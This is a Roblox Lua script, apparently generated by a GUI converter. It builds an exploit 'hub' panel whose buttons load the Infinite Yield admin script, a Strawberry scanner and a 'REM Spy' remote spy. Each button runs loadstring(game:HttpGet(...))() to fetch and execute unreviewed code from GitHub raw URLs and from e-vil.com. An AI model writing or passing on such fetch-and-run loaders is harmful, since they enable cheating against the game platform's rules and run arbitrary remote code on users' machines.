-- Gui to Lua
-- Version: 3.2

-- Instances:

local USMHUBV0 = Instance.new("ScreenGui")
local RedBacground = Instance.new("Frame")
local mainframe = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local InfiniteYeild = Instance.new("TextButton")
local StrawberryAdmin = Instance.new("TextButton")
local REM = Instance.new("TextButton")
local soon = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local USM = Instance.new("ImageLabel")
local USM_2 = Instance.new("ImageLabel")
local USM_3 = Instance.new("ImageLabel")
local USM_4 = Instance.new("ImageLabel")

--Properties:

USMHUBV0.Name = "USM HUB V0"
USMHUBV0.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
USMHUBV0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

RedBacground.Name = "Red Bacground"
RedBacground.Parent = USMHUBV0
RedBacground.BackgroundColor3 = Color3.fromRGB(70, 14, 14)
RedBacground.BackgroundTransparency = 0.300
RedBacground.BorderColor3 = Color3.fromRGB(0, 0, 0)
RedBacground.BorderSizePixel = 0
RedBacground.Position = UDim2.new(0.37327221, 0, 0.349999964, 0)
RedBacground.Size = UDim2.new(0, 454, 0, 300)

mainframe.Name = "main frame"
mainframe.Parent = RedBacground
mainframe.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
mainframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
mainframe.BorderSizePixel = 0
mainframe.Position = UDim2.new(0.023568308, 0, 0.0299999993, 0)
mainframe.Size = UDim2.new(0, 433, 0, 282)

UICorner.Parent = mainframe

InfiniteYeild.Name = "Infinite Yeild"
InfiniteYeild.Parent = mainframe
InfiniteYeild.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
InfiniteYeild.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYeild.BorderSizePixel = 0
InfiniteYeild.Position = UDim2.new(0.115000002, 0, 0.0500000007, 0)
InfiniteYeild.Size = UDim2.new(0, 332, 0, 25)
InfiniteYeild.Font = Enum.Font.Unknown
InfiniteYeild.LineHeight = 3.000
InfiniteYeild.Text = "Infinite Yeild"
InfiniteYeild.TextColor3 = Color3.fromRGB(189, 127, 13)
InfiniteYeild.TextScaled = true
InfiniteYeild.TextSize = 14.000
InfiniteYeild.TextWrapped = true

StrawberryAdmin.Name = "Strawberry Admin"
StrawberryAdmin.Parent = mainframe
StrawberryAdmin.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
StrawberryAdmin.BorderColor3 = Color3.fromRGB(0, 0, 0)
StrawberryAdmin.BorderSizePixel = 0
StrawberryAdmin.Position = UDim2.new(0.115000002, 0, 0.200000003, 0)
StrawberryAdmin.Size = UDim2.new(0, 332, 0, 25)
StrawberryAdmin.Font = Enum.Font.Unknown
StrawberryAdmin.LineHeight = 3.000
StrawberryAdmin.Text = "Strawberry Admin"
StrawberryAdmin.TextColor3 = Color3.fromRGB(189, 127, 13)
StrawberryAdmin.TextScaled = true
StrawberryAdmin.TextSize = 14.000
StrawberryAdmin.TextWrapped = true

REM.Name = "REM"
REM.Parent = mainframe
REM.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
REM.BorderColor3 = Color3.fromRGB(0, 0, 0)
REM.BorderSizePixel = 0
REM.Position = UDim2.new(0.115000002, 0, 0.349999994, 0)
REM.Size = UDim2.new(0, 332, 0, 25)
REM.Font = Enum.Font.Unknown
REM.LineHeight = 3.000
REM.Text = "REM Spy"
REM.TextColor3 = Color3.fromRGB(189, 127, 13)
REM.TextScaled = true
REM.TextSize = 14.000
REM.TextWrapped = true

soon.Name = "soon"
soon.Parent = mainframe
soon.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
soon.BorderColor3 = Color3.fromRGB(0, 0, 0)
soon.BorderSizePixel = 0
soon.Position = UDim2.new(0.117309429, 0, 0.481205612, 0)
soon.Size = UDim2.new(0, 332, 0, 109)
soon.Font = Enum.Font.Unknown
soon.LineHeight = 3.000
soon.Text = "COMING SOON"
soon.TextColor3 = Color3.fromRGB(189, 127, 13)
soon.TextScaled = true
soon.TextSize = 14.000
soon.TextWrapped = true

UICorner_2.Parent = RedBacground

USM.Name = "USM"
USM.Parent = USMHUBV0
USM.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM.BackgroundTransparency = 1.000
USM.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM.BorderSizePixel = 0
USM.Position = UDim2.new(0.650916755, 0, 0.361111104, 0)
USM.Size = UDim2.new(0, 50, 0, 50)
USM.Image = "rbxassetid://130430205967906"
USM.ImageTransparency = 0.200

USM_2.Name = "USM"
USM_2.Parent = USMHUBV0
USM_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM_2.BackgroundTransparency = 1.000
USM_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM_2.BorderSizePixel = 0
USM_2.Position = UDim2.new(0.380818009, 0, 0.654040396, 0)
USM_2.Size = UDim2.new(0, 50, 0, 50)
USM_2.Image = "rbxassetid://130430205967906"
USM_2.ImageTransparency = 0.200

USM_3.Name = "USM"
USM_3.Parent = USMHUBV0
USM_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM_3.BackgroundTransparency = 1.000
USM_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM_3.BorderSizePixel = 0
USM_3.Position = UDim2.new(0.650916755, 0, 0.654040396, 0)
USM_3.Size = UDim2.new(0, 50, 0, 50)
USM_3.Image = "rbxassetid://130430205967906"
USM_3.ImageTransparency = 0.200

USM_4.Name = "USM"
USM_4.Parent = USMHUBV0
USM_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM_4.BackgroundTransparency = 1.000
USM_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM_4.BorderSizePixel = 0
USM_4.Position = UDim2.new(0.380818009, 0, 0.361111104, 0)
USM_4.Size = UDim2.new(0, 50, 0, 50)
USM_4.Image = "rbxassetid://130430205967906"
USM_4.ImageTransparency = 0.200

-- Scripts:

local function GWXRE_fake_script() -- InfiniteYeild.Script 
	local script = Instance.new('Script', InfiniteYeild)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end)
end
coroutine.wrap(GWXRE_fake_script)()
local function HGOKQS_fake_script() -- StrawberryAdmin.Script 
	local script = Instance.new('Script', StrawberryAdmin)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/nightly/scanner.lua"))()
	end)
end
coroutine.wrap(HGOKQS_fake_script)()
local function VAQDON_fake_script() -- REM.Script 
	local script = Instance.new('Script', REM)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
	end)
end
coroutine.wrap(VAQDON_fake_script)()
